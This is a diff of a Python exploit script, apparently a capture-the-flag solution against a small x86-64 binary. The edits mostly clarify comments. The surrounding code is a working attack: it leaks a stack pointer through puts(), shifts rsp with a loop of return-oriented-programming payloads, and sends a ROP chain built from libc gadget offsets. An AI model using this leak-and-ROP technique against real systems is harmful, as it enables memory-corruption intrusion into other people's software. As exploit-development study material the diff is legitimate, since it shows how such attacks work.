@@ -40,13 +40,13 @@ if __name__ == "__main__":
 # sub_4004E6() pushes rbp into the stack
 # so we can leak the address with puts()
 #
-# 0xcafebabedeadbeef + 'A' + 
-# ef:be:ad:de:be:ba:fe:ca:41: a0:ad:0f:93:7f: 0a
+# cafebabe deadbeef + 'A' + addr + '\n'
+# ef:be:ad:de:be:ba:fe:ca: 41: a0:ad:0f:93:7f: 0a
 
 # leak rbp 
 
     mmap = resp[9:14]
-    mmap = "\x00" + mmap + "\x00\x00"
+    mmap = "\x00" + mmap + "\x00\x00" # replace 'A' with NULL
     mmap = u64(mmap)
 
     mmap -= 0x2000
@@ -87,7 +87,7 @@ if __name__ == "__main__":
 
     for i in xrange(0,10): # move down rsp by 0x10 at a time
         payload = p64(24)
-        payload += p64(0x4004d7) # call sub_4004E6(). At the end of 0x400532 gadget, rsp will be here ( -8 is for pop rbp )
+        payload += p64(0x4004d7) # call sub_4004E6(). At the end of 0x400532 gadget, rsp will be here ( -8 is to compensate for pop rbp )
         payload += p64(ORIGINAL_RSP - 24 - 0x10*i - 8)
         payload += p64(0x400532)
         r.send(payload)
@@ -120,7 +120,7 @@ if __name__ == "__main__":
     payload += p64(0xcafebabedeadbeef)
     payload += p64(0)
     payload += p64(LIBC_BASE + POP_RDI )
-    payload += ROP
+    payload += ROP # now we can overwrite the stack more than before
 
     r.send(p64(len(payload)))
     r.send(payload)
